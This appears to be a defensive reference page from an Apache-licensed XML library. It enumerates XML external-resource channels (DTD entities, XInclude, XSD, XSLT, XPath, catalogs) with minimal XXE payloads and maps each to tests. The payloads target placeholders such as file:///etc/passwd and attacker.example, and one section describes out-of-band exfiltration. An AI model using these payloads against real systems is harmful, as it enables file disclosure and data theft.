<!---
 Licensed to the Apache Software Foundation (ASF) under one or more
 contributor license agreements.  See the NOTICE file distributed with
 this work for additional information regarding copyright ownership.
 The ASF licenses this file to You under the Apache License, Version 2.0
 (the "License"); you may not use this file except in compliance with
 the License.  You may obtain a copy of the License at

      https://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->
# XML External Channels Reference

An XML document can reach outside itself in more ways than the DOCTYPE declaration everyone remembers.
This page enumerates every such channel, gives a minimal example of each, and assigns it a stable code
so that issues, tests, and review comments can refer to one precise mechanism instead of saying "XXE".

Each code has the form `PREFIX-n`, where the prefix names the layer the channel belongs to:

| Prefix | Layer                     | Requires                                          |
|--------|---------------------------|---------------------------------------------------|
| `DTD`  | Document type declaration | A DOCTYPE the processor does not reject           |
| `XI`   | XInclude                  | XInclude-aware processing                         |
| `XSD`  | XML Schema                | Schema compilation or schema validation           |
| `XSL`  | XSLT and TrAX             | A transformer, or `getAssociatedStylesheet`       |
| `XP`   | XPath 2.0 and later       | A processor implementing XPath 2.0+ (not the JDK) |
| `CAT`  | Catalog resolution        | A resolver that honors catalogs                   |

In the examples, `ext` stands for whatever the attacker controls: `file:///etc/passwd`,
`http://attacker.example/`, a `jar:` URI, or any other scheme the processor's URI handler accepts.
The `LEAK` marker stands for content the attacker wants to read back.

Whether a given channel is closed by this library, and under which settings, is stated in the [Threat Model](threat_model.html).
This page describes the attack surface, not the guarantees.

## DTD Channels

All `DTD-n` channels need a DOCTYPE declaration to survive.
A processor that rejects DOCTYPE outright, or that skips the DTD entirely, closes all of them at once.

### DTD-1: External Subset, SYSTEM Identifier

The external subset is fetched before any of its declarations are used.

```xml
<!DOCTYPE r SYSTEM "ext">
<r>&leak;</r>
```

### DTD-2: External Subset, PUBLIC Identifier

Identical to `DTD-1`, except that a public identifier is offered first.
A resolver that maps only system identifiers still sees the fetch, because the system identifier is
required on every external identifier.

```xml
<!DOCTYPE r PUBLIC "-//Example//DTD X//EN" "ext">
<r>&leak;</r>
```

### DTD-3: External General Entity

The classic XXE. The entity is declared in the internal subset and referenced from content.

```xml
<!DOCTYPE r [<!ENTITY leak SYSTEM "ext">]>
<r>&leak;</r>
```

### DTD-4: External Parameter Entity

A parameter entity is expanded inside the DTD itself, so the fetch happens during DTD processing and
does not need a reference from the document body.

```xml
<!DOCTYPE r [<!ENTITY % pe SYSTEM "ext"> %pe;]>
<r/>
```

### DTD-5: Parameter Entity Carrying a Further Declaration

The fetched parameter entity declares a second entity. This is the shape behind out-of-band XXE, where
the first fetch supplies a declaration whose system identifier embeds data read by a third fetch.

```xml
<!DOCTYPE r [<!ENTITY % p SYSTEM "ext"> %p;]>
<r>&leak;</r>
```

The retrieved `ext` contains, for instance:

```xml
<!ENTITY leak "LEAK">
```

### DTD-6: Unparsed Entity and Notation

An `NDATA` entity and the `NOTATION` it names are **not** retrieved by the parser. Their system
identifiers are reported to the application, which may fetch them itself.

```xml
<!DOCTYPE r [
  <!NOTATION n SYSTEM "urn:example:n">
  <!ENTITY e SYSTEM "ext" NDATA n>
  <!ATTLIST r a ENTITY #IMPLIED>]>
<r a="e"/>
```

This is a channel in the application, not in the parser. It is listed so that a reviewer who sees
`NDATA` in a payload knows where to look.

## XInclude Channels

`XI-n` channels are independent of the DTD. Disabling DOCTYPE does not close them, and neither do the
external-entity features; only XInclude-awareness or a resolver does.

### XI-1: Element Inclusion

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="ext"/>
</r>
```

An `xpointer` attribute selects a sub-resource of the same `href`. It narrows what is used, not what
is fetched, so it is not a separate channel.

### XI-2: Text Inclusion

`parse="text"` retrieves any byte stream, not just well-formed XML, so it reaches targets that
`XI-1` cannot parse.

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="ext" parse="text"/>
</r>
```

### XI-3: Fallback Inclusion

When the primary `href` fails, the fallback runs. A fallback may contain a further include, so
blocking the first fetch is not enough.

```xml
<r xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="does-not-exist">
    <xi:fallback><xi:include href="ext" parse="text"/></xi:fallback>
  </xi:include>
</r>
```

## Schema Channels

`XSD-1` through `XSD-4` are carried by a schema document, which is normally supplied by the
application. `XSD-5` is carried by the instance document, which is normally not.

### XSD-1: xs:include

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:include schemaLocation="ext"/>
</xs:schema>
```

### XSD-2: xs:import

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:import namespace="urn:example" schemaLocation="ext"/>
</xs:schema>
```

### XSD-3: xs:redefine

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:redefine schemaLocation="ext"/>
</xs:schema>
```

### XSD-4: xs:override

The XSD 1.1 replacement for `xs:redefine`. The stock JDK implements XSD 1.0 only, so this channel
appears only on a processor running in XSD 1.1 mode, such as Xerces.

```xml
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:override schemaLocation="ext"/>
</xs:schema>
```

### XSD-5: Schema Location Hints in the Instance Document

`xsi:schemaLocation` and `xsi:noNamespaceSchemaLocation` travel in the document being validated, which
makes them the only schema channel an attacker supplies directly. They are followed only once schema
validation is switched on: on a `DocumentBuilderFactory` that means `setValidating(true)` **together
with** the JAXP 1.2 `schemaLanguage` attribute, and a `Validator` built from an explicit `Schema`
ignores them entirely.

```xml
<r xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:noNamespaceSchemaLocation="ext"/>
```

```xml
<r xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="urn:example ext"/>
```

## XSLT and TrAX Channels

### XSL-1: xsl:import

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:import href="ext"/>
</xsl:stylesheet>
```

### XSL-2: xsl:include

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:include href="ext"/>
</xsl:stylesheet>
```

### XSL-3: The document() Function

Unlike `XSL-1` and `XSL-2`, the URI can be computed at run time from the source document, so a trusted
stylesheet can still fetch an attacker-chosen URI.

```xml
<xsl:template match="/">
  <xsl:copy-of select="document('ext')"/>
</xsl:template>
```

```xml
<xsl:copy-of select="document(/r/@href)"/>
```

### XSL-4: The xml-stylesheet Processing Instruction

This is the one XSLT channel carried by the instance document. Nothing follows it during an ordinary
parse: it is reached through
[`TransformerFactory.getAssociatedStylesheet`](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/transform/TransformerFactory.html#getAssociatedStylesheet(javax.xml.transform.Source,java.lang.String,java.lang.String,java.lang.String)),
which returns a `Source` whose system identifier came from document content. Handing that `Source` to
`newTransformer` performs the fetch.

```xml
<?xml-stylesheet type="text/xsl" href="ext"?>
<r/>
```

### XSL-5: xsl:import-schema

Schema-aware XSLT 2.0 and later. It reaches the schema channels above from inside a stylesheet.

```xml
<xsl:import-schema namespace="urn:example" schema-location="ext"/>
```

### XSL-6: unparsed-text()

XSLT 2.0 and later. Like `XI-2`, it retrieves a resource that is not well-formed XML.

```xml
<xsl:value-of select="unparsed-text('ext')"/>
```

## XPath 2.0 and Later Channels

These functions are absent from the JDK's XPath 1.0 engine and present on Saxon. They are reachable
from a stylesheet, from a standalone XPath evaluation, and from XQuery.

### XP-1: doc() and doc-available()

```xpath2
doc('ext')/r
```

`doc-available()` returns true
[if and only if a call to `doc()` would return a document node](https://www.w3.org/TR/xpath-functions-31/#func-doc-available),
so it performs the same retrieval but yields a boolean instead of the content. That makes it a blind
channel: it reports whether a file exists or a host answers, and it stays useful to an attacker who
has no way to read a fetched document back out of the result.

```xpath2
doc-available('ext')
```

### XP-2: collection()

Retrieves a whole collection of resources from one URI.

```xpath2
collection('ext')
```

### XP-3: unparsed-text()

```xpath2
unparsed-text('ext')
```

### XP-4: json-doc()

XPath 3.1. Parses the retrieved resource as JSON rather than XML.

```xpath2
json-doc('ext')?leak
```

## Catalog Channels

### CAT-1: The oasis-xml-catalog Processing Instruction

A document can ask the resolver to load a catalog of its own choosing, which then redirects any of the
channels above. The JDK's `javax.xml.catalog` resolver ignores this instruction;
[XML Resolver](https://www.xmlresolver.org/) honors it unless configured otherwise.

```xml
<?oasis-xml-catalog catalog="ext"?>
<r/>
```

## Channel Index

| Code    | Channel                                 | Carried by        | Status           | Covered by                                       |
|---------|-----------------------------------------|-------------------|------------------|--------------------------------------------------|
| `DTD-1` | External subset, SYSTEM                 | Instance          | Verified         | `ExternalDtdTest`                                |
| `DTD-2` | External subset, PUBLIC                 | Instance          | Verified         | `ExternalDtdTest`                                |
| `DTD-3` | External general entity                 | Instance          | Verified         | `ExternalGeneralEntityTest`                      |
| `DTD-4` | External parameter entity               | Instance          | Verified         | `ExternalParameterEntityTest`                    |
| `DTD-5` | Parameter entity carrying a declaration | Instance          | Verified         | `ExternalParameterEntityTest`                    |
| `DTD-6` | Unparsed entity and notation            | Instance          | Not parser-side  | none                                             |
| `XI-1`  | XInclude, element                       | Instance          | Verified         | `XIncludeTest`                                   |
| `XI-2`  | XInclude, text                          | Instance          | Verified         | `XIncludeTest`                                   |
| `XI-3`  | XInclude, fallback                      | Instance          | Verified         | `XIncludeTest`                                   |
| `XSD-1` | `xs:include`                            | Schema            | Verified         | `SchemaIncludeTest`                              |
| `XSD-2` | `xs:import`                             | Schema            | Verified         | `SchemaImportTest`                               |
| `XSD-3` | `xs:redefine`                           | Schema            | Verified         | `SchemaRedefineTest`                             |
| `XSD-4` | `xs:override`                           | Schema            | By specification | none                                             |
| `XSD-5` | `xsi:schemaLocation` hints              | Instance          | Verified         | `SchemaLocationDomTest`, `SchemaLocationSaxTest` |
| `XSL-1` | `xsl:import`                            | Stylesheet        | Verified         | `TemplatesImportTest`                            |
| `XSL-2` | `xsl:include`                           | Stylesheet        | Verified         | `TemplatesIncludeTest`                           |
| `XSL-3` | `document()`                            | Stylesheet        | Verified         | `TransformerDocumentTest`                        |
| `XSL-4` | `<?xml-stylesheet?>`                    | Instance          | Verified         | `AssociatedStylesheetTest`                       |
| `XSL-5` | `xsl:import-schema`                     | Stylesheet        | By specification | none                                             |
| `XSL-6` | `unparsed-text()`                       | Stylesheet        | By specification | `SaxonTransformerExternalCallsTest`              |
| `XP-1`  | `doc()`, `doc-available()`              | Stylesheet, XPath | By specification | `SaxonXPathExternalCallsTest`                    |
| `XP-2`  | `collection()`                          | Stylesheet, XPath | By specification | none                                             |
| `XP-3`  | `unparsed-text()`                       | Stylesheet, XPath | By specification | `SaxonXPathExternalCallsTest`                    |
| `XP-4`  | `json-doc()`                            | Stylesheet, XPath | By specification | `SaxonXPathExternalCallsTest`                    |
| `CAT-1` | `<?oasis-xml-catalog?>`                 | Instance          | By specification | none                                             |

"Carried by" says which document holds the reference. **Instance** means the document an attacker
submits, so those channels are open whenever untrusted XML is parsed at all. **Schema** and
**Stylesheet** mean the reference sits in a file the application supplies, which is why they are
usually restricted to an allow-list rather than closed: splitting a schema or a stylesheet across
files is ordinary practice. `XSL-3` is the exception in that group, because its URI can be computed
from the untrusted input at run time.

## Relative URIs and the Base URI

None of the channels above is closed by rejecting absolute URIs. A relative reference is resolved
against the base URI of the document that carries it, and `xml:base` lets a document move that base.
Restricting a channel therefore means deciding what the resolved, absolute URI is allowed to be, not
what the reference looks like in the source.

```xml
<r xml:base="ext" xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="relative.xml"/>
</r>
```
